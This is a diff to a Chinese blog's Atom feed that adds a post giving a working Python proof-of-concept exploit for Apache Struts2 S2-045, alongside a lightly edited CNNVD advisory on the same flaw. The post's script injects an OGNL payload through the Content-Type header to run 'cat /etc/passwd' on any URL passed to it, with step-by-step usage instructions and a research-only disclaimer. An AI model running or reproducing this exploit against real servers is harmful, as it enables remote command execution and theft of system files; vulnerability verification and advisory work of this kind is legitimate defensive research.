@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.unixmen.cn/"/>
-  <updated>2017-03-07T07:41:32.000Z</updated>
+  <updated>2017-03-07T08:41:18.000Z</updated>
   <id>http://blog.unixmen.cn/</id>
   
   <author>
@@ -16,11 +16,44 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Struts-045 漏洞验证</title>
+    <link href="http://blog.unixmen.cn/2017/03/07/Struts-045-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/"/>
+    <id>http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/</id>
+    <published>2017-03-07T08:20:18.000Z</published>
+    <updated>2017-03-07T08:41:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Struts-045-漏洞验证"><a href="#Struts-045-漏洞验证" class="headerlink" title="Struts-045-漏洞验证"></a>Struts-045-漏洞验证</h1><p> 接上篇<br>注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。</p>
+<h2 id="一、脚本信息"><a href="#一、脚本信息" class="headerlink" title="一、脚本信息"></a>一、脚本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/env python</div><div class="line"># encoding:utf-8</div><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def poc():</div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;)</div><div class="line">    header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</div><div class="line">    header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</div><div class="line">    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    print response.read()</div><div class="line"></div><div class="line"></div><div class="line">poc()</div></pre></td></tr></table></figure>
+<h2 id="二、使用帮助"><a href="#二、使用帮助" class="headerlink" title="二、使用帮助"></a>二、使用帮助</h2><ul>
+<li>将脚本命名为st-045.py</li>
+<li>在工作目录创建 image1 和 tmp.txt两个空文件</li>
+<li>执行 python st-045.py URL<br>如下图所示：<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc.png" alt=""><br>三、漏洞修复后<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc_fixed.png" alt=""></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Struts-045-漏洞验证&quot;&gt;&lt;a href=&quot;#Struts-045-漏洞验证&quot; class=&quot;headerlink&quot; title=&quot;Struts-045-漏洞验证&quot;&gt;&lt;/a&gt;Struts-045-漏洞验证&lt;/h1&gt;&lt;p&gt; 接上篇&lt;br&gt;注：本脚本仅为Str
+    
+    </summary>
+    
+      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
+    
+      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
+    
+  </entry>
+  
+  <entry>
     <title>关于Apache Struts2（S2-045）漏洞情况的通报</title>
     <link href="http://blog.unixmen.cn/2017/03/07/%E5%85%B3%E4%BA%8EApache-Struts2%EF%BC%88S2-045%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%83%85%E5%86%B5%E7%9A%84%E9%80%9A%E6%8A%A5/"/>
     <id>http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/</id>
     <published>2017-03-07T07:28:49.000Z</published>
-    <updated>2017-03-07T07:41:32.000Z</updated>
+    <updated>2017-03-07T07:52:55.000Z</updated>
     
     <content type="html"><![CDATA[<p>关于Apache Struts2 （S2-045）远程代码执行漏洞通报<br>近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（<a href="http://www.cnnvd.org.cn/vulnerability/show/cv_id/2017030152" target="_blank" rel="external">CNNVD-201703-152</a>）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下：</p>
 <h1 id="一、-漏洞简介"><a href="#一、-漏洞简介" class="headerlink" title="一、 漏洞简介"></a>一、 漏洞简介</h1><p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。  </p>
@@ -41,7 +74,7 @@
 <p>如用户不方便升级，可采取如下临时解决方案：</p>
 <p> 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
 <ul>
-<li>相关链接<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">Aapache 安全公告</a></li>
+<li>相关链接<br>官方<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">Aapache Struts2（S2-045）安全公告</a></li>
 </ul>
 ]]></content>
     
